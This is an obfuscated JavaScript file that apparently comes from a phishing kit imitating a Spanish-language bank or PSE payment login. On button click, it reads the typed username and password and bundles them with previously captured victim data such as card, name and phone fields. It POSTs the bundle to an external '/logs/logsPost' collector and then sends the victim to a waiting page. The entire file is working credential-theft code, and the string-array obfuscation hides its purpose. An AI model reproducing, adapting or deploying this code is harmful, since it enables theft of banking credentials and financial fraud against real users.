const _0x5d330a = _0x3591;
(function (_0x3f3951, _0x4c6cb4) {
  const _0x2494b8 = _0x3591,
    _0x945e77 = _0x3f3951();
  while (!![]) {
    try {
      const _0x4244fd =
        (-parseInt(_0x2494b8(0xd5)) / 0x1) *
          (-parseInt(_0x2494b8(0xf1)) / 0x2) +
        -parseInt(_0x2494b8(0xe3)) / 0x3 +
        (-parseInt(_0x2494b8(0xd3)) / 0x4) * (parseInt(_0x2494b8(0xdb)) / 0x5) +
        (-parseInt(_0x2494b8(0xf7)) / 0x6) *
          (-parseInt(_0x2494b8(0xd6)) / 0x7) +
        (-parseInt(_0x2494b8(0xea)) / 0x8) *
          (-parseInt(_0x2494b8(0xda)) / 0x9) +
        (parseInt(_0x2494b8(0xd7)) / 0xa) * (-parseInt(_0x2494b8(0xe1)) / 0xb) +
        parseInt(_0x2494b8(0xe4)) / 0xc;
      if (_0x4244fd === _0x4c6cb4) break;
      else _0x945e77["push"](_0x945e77["shift"]());
    } catch (_0x3bff13) {
      _0x945e77["push"](_0x945e77["shift"]());
    }
  }
})(_0x5c72, 0xb5612);
function updateLS() {
  const _0x375d7d = _0x3591;
  LS["setItem"](_0x375d7d(0xf2), JSON["stringify"](info));
}
const button = document[_0x5d330a(0xdf)](_0x5d330a(0xe7)),
  userInput = document[_0x5d330a(0xdf)](_0x5d330a(0xf0)),
  passInput = document[_0x5d330a(0xdf)](_0x5d330a(0xd4));
function _0x3591(_0x14a0ba, _0x1e90ce) {
  const _0x5c7247 = _0x5c72();
  return (
    (_0x3591 = function (_0x359149, _0x3079c8) {
      _0x359149 = _0x359149 - 0xd3;
      let _0x205cd9 = _0x5c7247[_0x359149];
      return _0x205cd9;
    }),
    _0x3591(_0x14a0ba, _0x1e90ce)
  );
}
button[_0x5d330a(0xe5)](_0x5d330a(0xf8), async function (_0x19aba9) {
  const _0x2823d9 = _0x5d330a;
  _0x19aba9[_0x2823d9(0xf3)](), (button[_0x2823d9(0xeb)] = !![]);
  if (userInput[_0x2823d9(0xd8)] == "" && passInput[_0x2823d9(0xd8)] == "") {
    alert(_0x2823d9(0xe9)),
      userInput[_0x2823d9(0xf6)](),
      (button[_0x2823d9(0xeb)] = ![]);
    return;
  } else {
    var _0x3a081a = userInput[_0x2823d9(0xd8)],
      _0x38b65f = passInput["value"];
    (info[_0x2823d9(0xdc)]["user"] = _0x3a081a),
      (info[_0x2823d9(0xdc)][_0x2823d9(0xf4)] = _0x38b65f),
      updateLS();
    const _0xa6e2ab = {
      reg: info["metaInfo"]["cc"],
      name: info[_0x2823d9(0xdc)][_0x2823d9(0xe6)],
      cl: info[_0x2823d9(0xdc)][_0x2823d9(0xdd)],
      us: info[_0x2823d9(0xdc)]["user"],
      ps: info["metaInfo"]["puser"],
      bn: _0x2823d9(0xe8),
      status: "Ingresó\x20datos",
      fuente: _0x2823d9(0xe2),
    };
    try {
      const _0x352329 = await fetch(url + _0x2823d9(0xde), {
        method: _0x2823d9(0xf5),
        headers: { "Content-Type": _0x2823d9(0xec) },
        body: JSON["stringify"](_0xa6e2ab),
      });
      if (!_0x352329["ok"]) throw new Error(_0x2823d9(0xe0));
      const _0x2a7313 = await _0x352329[_0x2823d9(0xee)]();
      window[_0x2823d9(0xed)]["href"] = _0x2823d9(0xd9);
    } catch (_0x25a529) {
      console[_0x2823d9(0xef)]("Error:", _0x25a529),
        (button[_0x2823d9(0xeb)] = ![]);
    }
  }
});
function _0x5c72() {
  const _0x38c318 = [
    "50oJEeMm",
    "value",
    "./wait.html",
    "27GaSDmO",
    "35QbZmfJ",
    "metaInfo",
    "telnum",
    "/logs/logsPost",
    "getElementById",
    "Network\x20response\x20was\x20not\x20ok",
    "717178ftiKbn",
    "PSE",
    "3484764sjUDDN",
    "6468756uwkUrd",
    "addEventListener",
    "dudename",
    "btnUsuario",
    "🟢\x20Fal4be114",
    "Por\x20favor\x20ingrese\x20la\x20información\x20requerida",
    "2773208qMGfgh",
    "disabled",
    "application/json",
    "location",
    "json",
    "error",
    "txtUsuario",
    "958xmMgxe",
    "info",
    "preventDefault",
    "puser",
    "POST",
    "focus",
    "3534LTqEMQ",
    "click",
    "477592LhqHFh",
    "txtPass",
    "1215tianpL",
    "10759KEJkBj",
  ];
  _0x5c72 = function () {
    return _0x38c318;
  };
  return _0x5c72();
}
